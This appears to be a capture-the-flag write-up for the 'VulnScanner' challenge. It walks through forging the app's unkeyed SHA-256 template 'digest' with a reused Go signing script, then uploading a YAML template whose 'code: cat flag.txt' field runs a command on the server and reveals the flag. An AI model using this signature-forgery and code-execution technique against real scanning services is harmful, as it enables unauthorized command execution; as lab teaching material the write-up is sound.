# VulnScanner
![Image](https://github.com/user-attachments/assets/e56bfb0e-507b-4e54-9bb0-3631c92d0de2)

**Attachment:** [challenge.zip](https://github.com/user-attachments/files/19092981/challenge.zip)  
**Password:** snyk-ftf-2025

## Writeup

![Image](https://github.com/user-attachments/assets/fc6aa783-919b-446a-b20e-5068e07067e7)

"VulnScanner" is an open-source vulnerability scanner that allows you to test and automate security checks on your services. It uses custom **YAML**-based templates to define security checks such as HTTP status codes, response bodies, and other network parameters. The scanner sends requests to the specified services and compares the responses with predefined expectations. It's a useful tool for automating vulnerability testing in development or production environments.

In the "Explore Templates" section, I can see an example with a template that runs code:

![Image](https://github.com/user-attachments/assets/b1893dbc-0e3b-4e81-a2c3-64b6249e5ed2)

Additionally, a list of templates is provided:

![Image](https://github.com/user-attachments/assets/e9618614-976d-4349-aeed-697a2574e63e)

All provided examples are signed with a **known digest**:

```
a7f3546ab25c5e0f7f67a7fedbe77336c735de64b8ad1e75b88e7b1c5a2755c4
fd98ae330ebfa73e90fac55ee5eb1aac874acecf9fb3222f65a0de81fec27210
3ec41e2a51ff8ac34dadf530d4396d86a99db38daff7feb39283c068e299061a
```

If I try to upload a `.yaml` file, the site returns "Failed to verify template digest". I need to script a `golang` code that signs my template.

The following is the relevant part of the source code that signs the templates:

```golang
package utils

import (
	"crypto/sha256"
	"errors"
	"fmt"
	"io/ioutil"
	"os"
	"regexp"
	"strings"

	"gopkg.in/yaml.v3"
)

func SignTemplate(content string) (string, string, error) {
	normalizedContent := NormalizeContent(content)
	hash := sha256.Sum256([]byte(normalizedContent))
	hexHash := fmt.Sprintf("%x", hash)
	signedTemplate := fmt.Sprintf("%s\n# digest: %s\n", content, hexHash)
	return signedTemplate, hexHash, nil
}
```

```golang
func NormalizeContent(content string) string {
	var yamlContent interface{}
	err := yaml.Unmarshal([]byte(content), &yamlContent)
	if err != nil {
		return content
	}

	normalizedContent, err := yaml.Marshal(yamlContent)
	if err != nil {
		return content
	}
	normalizedContentStr := strings.TrimSpace(string(normalizedContent))
	return normalizedContentStr
}
```

I can reuse this code and add a **function** to accept a **template file** as an argument in order to sign it:

```golang
package main

import (
	"crypto/sha256"
	"fmt"
	"io/ioutil"
	"os"
	"strings"

	"gopkg.in/yaml.v3"
)

func SignTemplate(content string) (string, string, error) {
	normalizedContent := NormalizeContent(content)
	hash := sha256.Sum256([]byte(normalizedContent))
	hexHash := fmt.Sprintf("%x", hash)
	signedTemplate := fmt.Sprintf("%s\n# digest: %s\n", content, hexHash)
	return signedTemplate, hexHash, nil
}

func NormalizeContent(content string) string {
	var yamlContent interface{}
	err := yaml.Unmarshal([]byte(content), &yamlContent)
	if err != nil {
		return content
	}

	normalizedContent, err := yaml.Marshal(yamlContent)
	if err != nil {
		return content
	}
	normalizedContentStr := strings.TrimSpace(string(normalizedContent))
		return normalizedContentStr
	}

func main() {
	if len(os.Args) < 2 {
		fmt.Println("Usage: go run main.go <template_file>")
		return
	}

	templateFile := os.Args[1]
	content, err := ioutil.ReadFile(templateFile)
	if err != nil {
		fmt.Printf("Error reading file: %s\n", err)
		return
	}

	signedTemplate, _, err := SignTemplate(string(content))
	if err != nil {
		fmt.Printf("Error signing template: %s\n", err)
		return
	}
	fmt.Println(signedTemplate)
}
```

I created a **template** that reads the flag:

```yaml
name: Flag
description: text
type: http
requests:
  - method: GET
    path:
      - "/"
    matchers:
      - type: status
        status:
          - 200
code: cat flag.txt
```

After after creating the `golang` project, I installed the dependencies and ran the code to create a signed template:

```bash
go mod init yaml-signer
go get gopkg.in/yaml.v3
go run main.go template.yaml > signed_template.yaml
```

I finally uploaded my `signed_template.yaml` and get the flag:

![Image](https://github.com/user-attachments/assets/8cc420b8-82a1-4e66-9a90-423f75267311)

**flag{e800eecf32271d760b27201eef192ead}**
